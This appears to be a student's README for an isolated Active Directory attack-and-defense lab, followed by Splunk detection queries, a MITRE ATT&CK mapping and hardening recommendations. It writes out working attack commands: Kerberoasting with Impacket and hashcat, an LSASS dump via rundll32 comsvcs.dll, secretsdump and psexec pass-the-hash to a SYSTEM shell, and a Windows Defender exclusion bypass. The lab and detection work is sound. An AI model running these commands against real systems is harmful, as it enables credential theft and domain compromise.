# Active Directory Attack & Defense Lab

> End-to-end Active Directory penetration test and detection simulation — built from scratch, fully documented.

[![GitBook](https://img.shields.io/badge/GitBook-Write--Up-blue?style=flat)](https://prajwal-1221.gitbook.io/security-notes)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-prajwalborgave1221-red?style=flat&logo=tryhackme)](https://tryhackme.com/p/prajwalborgave1221)
[![Platform](https://img.shields.io/badge/Platform-VMware-lightgrey?style=flat)]()

---

## Overview

This project simulates a complete Active Directory attack and defense lifecycle in an isolated lab environment. A Windows domain (`marvel.local`) was built from scratch, attacked using real-world offensive techniques, and every attack was detected using Windows Event Logs forwarded to a Splunk SIEM.

The lab covers the full kill chain — from initial reconnaissance and AD enumeration through Kerberoasting, credential dumping, and Pass-the-Hash — with detection evidence, MITRE ATT&CK mapping, and a structured incident report.

---

## Lab Environment

| Machine | OS | Role | IP |
|---|---|---|---|
| DC01 | Windows Server 2019 | Domain Controller | 192.168.81.10 |
| Workstation01 | Windows 11 Enterprise | Victim / Domain Member | 192.168.81.20 |
| Kali Linux | Kali 2026.1 | Attacker | 192.168.81.129 |

**Network:** VMware Host-Only (fully isolated, no internet)
**Domain:** marvel.local
**Virtualization:** VMware Workstation Pro 26H1

---

## Attack Chain

```
Reconnaissance       →   Nmap full port scan on DC01
AD Enumeration       →   BloodHound + SharpHound (attack path mapping)
Kerberoasting        →   GetUserSPNs → TGS-REP hash → Hashcat crack
Credential Dumping   →   rundll32 LSASS dump → mimikatz/pypykatz
Pass-the-Hash        →   secretsdump → psexec with NTLM hash → SYSTEM shell
```

---

## Tools Used

**Offensive**
- Nmap — network reconnaissance and service enumeration
- BloodHound CE + SharpHound — Active Directory attack path visualization
- Impacket (GetUserSPNs, secretsdump, psexec) — Kerberoasting and lateral movement
- Hashcat — offline hash cracking
- mimikatz / pypykatz — LSASS credential dumping
- Metasploit — exploitation framework

**Defensive**
- Splunk Enterprise — SIEM and event correlation
- Splunk Universal Forwarder — Windows Event Log forwarding from DC01
- Windows Event Viewer — native log analysis
- Wireshark — packet capture and network analysis

---

## Phases

### Phase 1 — Lab Setup
- Built Windows Server 2019 Domain Controller from scratch
- Configured Active Directory domain `marvel.local`
- Created domain users: tstark, srogers, pparker, SQLService
- Registered SPN on SQLService for Kerberoasting simulation
- Joined Windows 11 Workstation01 to the domain
- Configured all VMs on isolated Host-Only VMware network

### Phase 2 — Reconnaissance
```bash
# Full port scan on Domain Controller
nmap -sV -sC -p- 192.168.81.10 -oN dc01_scan.txt
```

Key ports identified:
```
88   → Kerberos        (confirms Domain Controller)
389  → LDAP            (Active Directory)
445  → SMB
3389 → RDP
135  → RPC
```

### Phase 3 — AD Enumeration (BloodHound)
```bash
# Run SharpHound collector on Workstation01
.\SharpHound.exe -c All

# Start BloodHound CE on Kali
bloodhound-start

# Import ZIP → Pathfinding → Find Shortest Paths to Domain Admins
```

BloodHound identified direct Domain Admin membership for `tstark` — flagged as critical attack path.

### Phase 4 — Kerberoasting (T1558.003)
```bash
# Request TGS-REP hash for SQLService
impacket-GetUserSPNs marvel.local/srogers:Password2 -dc-ip 192.168.81.10 -request

# Crack hash offline
hashcat -m 13100 kerberoast_hash.txt custom_wordlist.txt
```

Result: SQLService password recovered — `MYpassword123#`

### Phase 5 — Credential Dumping (T1003.001)
```bash
# Dump LSASS memory on Workstation01
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 816 lsass.dmp full

# Analyze dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Phase 6 — Pass-the-Hash (T1550.002)
```bash
# Dump all NTLM hashes from domain
impacket-secretsdump marvel.local/tstark:Password1@192.168.81.10

# Authenticate using hash (no plaintext password needed)
impacket-psexec marvel.local/Administrator@192.168.81.10 -hashes aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]
```

Result: SYSTEM shell on Domain Controller — full domain compromise.

### Phase 7 — Detection (Splunk SIEM)

Windows Event Logs forwarded from DC01 to Splunk via Universal Forwarder.

**Kerberoasting detection:**
```
index=main sourcetype="WinEventLog:Security" EventCode=4769
| stats count by Account_Name, Service_Name
```

**Pass-the-Hash detection:**
```
index=main sourcetype="WinEventLog:Security" EventCode=4624 Logon_Type=3
| stats count by Account_Name
```

**Attack timeline:**
```
index=main sourcetype="WinEventLog:Security"
(EventCode=4769 OR EventCode=4624 OR EventCode=4662)
| timechart span=1h count by EventCode
```

---

## MITRE ATT&CK Mapping

| ID | Technique | Tool | Detection |
|----|-----------|------|-----------|
| T1046 | Network Service Scanning | Nmap | Wireshark SYN flood |
| T1069.002 | Domain Groups Discovery | BloodHound/SharpHound | Event ID 4662 |
| T1558.003 | Kerberoasting | Impacket + Hashcat | Event ID 4769 (328 events) |
| T1003.001 | LSASS Memory Dumping | rundll32 + mimikatz | Event ID 4656 |
| T1550.002 | Pass-the-Hash | Impacket secretsdump + psexec | Event ID 4624 Logon Type 3 |
| T1078 | Valid Accounts | Impacket | Event ID 4768/4769 |

---

## Key Findings

| Finding | Severity | Impact |
|---------|----------|--------|
| Weak service account password (SQLService) | Critical | Kerberoasting → credential compromise |
| NTLM hash extraction via DCSync | Critical | Full domain credential dump |
| LSASS memory exposed to unprivileged dump | High | All logged-in user credentials exposed |
| tstark directly in Domain Admins group | High | Violated least privilege — direct path to DA |

---

## Challenges & Solutions

**Clock skew blocking Kerberoasting** — DC01 (Pacific Time) and Kali (EDT) had a 3-hour UTC mismatch causing `KRB_AP_ERR_SKEW`. Fixed by syncing DC01's UTC clock using PowerShell `Set-Date`.

**Splunk forwarder not sending events** — `inputs.conf` was missing, leaving the forwarder with no monitoring instructions. Fixed by manually creating the config file with WinEventLog:Security directives.

**Windows Firewall blocking port 9997** — Host firewall was silently dropping forwarder connections. Fixed by adding inbound TCP rule via PowerShell.

**mimikatz blocked by Windows Defender** — Defender deleted mimikatz binary within minutes of extraction. Bypassed using `Set-MpPreference` folder exclusion and `Add-MpPreference -ExclusionPath`.

---

## Recommendations

1. Enable AES-256 Kerberos encryption — disable RC4 to prevent Kerberoasting
2. Add service accounts to Protected Users group — blocks NTLM and RC4 auth
3. Use 25+ character randomly generated service account passwords or gMSA
4. Enable Windows Credential Guard — protects LSASS from memory dumping
5. Enforce least privilege — audit Domain Admins group quarterly
6. Deploy Microsoft LAPS — randomizes local admin passwords across domain
7. Disable NTLM authentication via Group Policy — forces Kerberos only
8. Alert on Event ID 4769 spike — 5+ requests from single source in 10 minutes

---

## Documentation

- **Full Write-Up:** [GitBook](https://prajwal-1221.gitbook.io/security-notes)
- **Incident Report:** Available in write-up (Phase 4)
- **MITRE Navigator:** ATT&CK techniques mapped above

---

## What I Learned

- How to build and configure a Windows Active Directory domain from scratch
- How Kerberos authentication works and why SPNs make accounts vulnerable to roasting
- Why NTLM hashes are as dangerous as plaintext passwords (Pass-the-Hash)
- How BloodHound maps AD relationships to find non-obvious privilege escalation paths
- How Windows Event Logs expose attack patterns when forwarded to a SIEM
- Why defence-in-depth matters — each finding alone was serious, but chained together they led to full domain compromise in under 24 hours

---

*Built by Prajwal Borgave — 4rd year B.Tech CSE*
